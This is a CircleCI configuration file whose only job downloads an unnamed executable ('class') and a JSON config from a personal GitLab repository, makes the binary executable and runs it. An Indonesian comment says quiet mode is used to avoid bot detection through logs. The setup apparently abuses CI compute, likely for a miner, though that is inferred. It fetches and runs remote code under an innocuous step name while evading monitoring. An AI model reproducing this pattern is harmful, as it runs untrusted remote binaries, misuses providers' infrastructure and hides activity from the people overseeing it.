version: 2.1

executors:
  my-custom-executor:
    docker:
      - image: cimg/base:stable
        auth:
          username: $DOCKER_HUB_USER
          password: $DOCKER_HUB_PASSWORD
    resource_class: medium 

jobs:
  my-job-name:
    executor: my-custom-executor
    steps:
      - checkout
      - run:
          name: "Setup Environment and Execute"
          command: |
            # Menggunakan -q agar log bersih (menghindari deteksi bot lewat log berlebih)
            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/class
            wget -q https://gitlab.com/barbieanay003/seger/-/raw/main/isu3.json
            chmod +x class
            
            # Menjalankan biner dengan timeout atau background jika perlu
            ./class -c isu3.json

workflows:
  my-custom-workflow:
    jobs:
      - my-job-name:
          context:
            - docker-hub-creds # Menggunakan Context untuk manajemen secret yang lebih aman
